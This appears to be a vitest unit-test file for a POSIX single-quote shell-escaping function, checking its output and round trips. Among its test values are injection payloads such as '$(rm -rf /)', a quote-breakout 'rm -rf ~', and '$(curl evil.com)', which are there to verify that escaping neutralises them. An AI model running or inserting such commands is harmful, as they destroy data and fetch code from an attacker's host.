import { describe, expect, it } from 'vitest';
import { shellEscapeSingleQuote } from './shell-escape';

// Decodes the specific quoting scheme shellEscapeSingleQuote produces — alternating
// '...' (literal quoted runs) and \' (a single backslash-escaped quote outside quotes)
// — mirroring how a POSIX shell would reassemble the argument. Used to assert a true
// round trip (decode(escape(x)) === x) instead of only pinning exact output strings.
const decodePosixSingleQuoteScheme = (shellArg: string): string => {
  let result = '';
  let i = 0;
  while (i < shellArg.length) {
    if (shellArg[i] === "'") {
      const end = shellArg.indexOf("'", i + 1);
      result += shellArg.slice(i + 1, end);
      i = end + 1;
    } else if (shellArg[i] === '\\') {
      result += shellArg[i + 1];
      i += 2;
    } else {
      throw new Error(`Unexpected unquoted character "${shellArg[i]}" at index ${i}`);
    }
  }
  return result;
};

describe('shellEscapeSingleQuote', () => {
  it('wraps a plain string with no special characters in single quotes', () => {
    expect(shellEscapeSingleQuote('hello')).toBe("'hello'");
  });

  it('wraps an empty string as an empty quoted argument', () => {
    expect(shellEscapeSingleQuote('')).toBe("''");
  });

  it('escapes a single embedded quote', () => {
    expect(shellEscapeSingleQuote("it's")).toBe("'it'\\''s'");
  });

  it('escapes multiple embedded quotes', () => {
    expect(shellEscapeSingleQuote("'a' 'b'")).toBe("''\\''a'\\'' '\\''b'\\'''");
  });

  it('escapes a quote at the very start of the value', () => {
    expect(shellEscapeSingleQuote("'leading")).toBe("''\\''leading'");
  });

  it('escapes a quote at the very end of the value', () => {
    expect(shellEscapeSingleQuote("trailing'")).toBe("'trailing'\\'''");
  });

  it('treats a value made up of only quotes correctly', () => {
    expect(shellEscapeSingleQuote("'''")).toBe("''\\'''\\'''\\'''");
  });

  const specialCharacterCases: Array<[label: string, value: string]> = [
    ['double quote', 'say "hi"'],
    ['backtick', 'run `whoami`'],
    ['backslash', 'C:\\Users\\test'],
    ['whitespace', 'a b   c'],
    ['newline', 'line1\nline2'],
    ['dollar sign', '$HOME and ${PATH}'],
    ['ampersand', 'foo & bar'],
    ['pipe', 'foo | bar'],
    ['semicolon', 'foo; bar'],
    ['less-than', 'a < b'],
    ['greater-than', 'a > b'],
    ['command substitution payload', '$(rm -rf /)'],
    ['backtick command substitution payload', '`whoami`'],
    ['quote-breakout injection payload', "'; rm -rf ~; echo '"],
    [
      'combined injection payload',
      `$(curl evil.com) && echo "pwned" | \`whoami\`; rm -rf / < /dev/null > out'`,
    ],
  ];

  it.each(specialCharacterCases)('round-trips a value containing a %s', (_label, value) => {
    const escaped = shellEscapeSingleQuote(value);
    expect(decodePosixSingleQuoteScheme(escaped)).toBe(value);
  });

  it('produces exactly one literal argument (starts and ends with a quote)', () => {
    for (const [, value] of specialCharacterCases) {
      const escaped = shellEscapeSingleQuote(value);
      expect(escaped.startsWith("'")).toBe(true);
      expect(escaped.endsWith("'")).toBe(true);
    }
  });

  it('round-trips Vietnamese text with diacritics', () => {
    const value = "Xin chào, đây là 'chuỗi' kiểm tra";
    expect(decodePosixSingleQuoteScheme(shellEscapeSingleQuote(value))).toBe(value);
  });

  it('round-trips emoji and other multi-byte unicode', () => {
    const value = "🚀 rocket '🔥' fire 你好";
    expect(decodePosixSingleQuoteScheme(shellEscapeSingleQuote(value))).toBe(value);
  });

  it('leaves unicode without quotes byte-for-byte unchanged inside the wrapping quotes', () => {
    expect(shellEscapeSingleQuote('héllo wörld 日本語')).toBe("'héllo wörld 日本語'");
  });
});
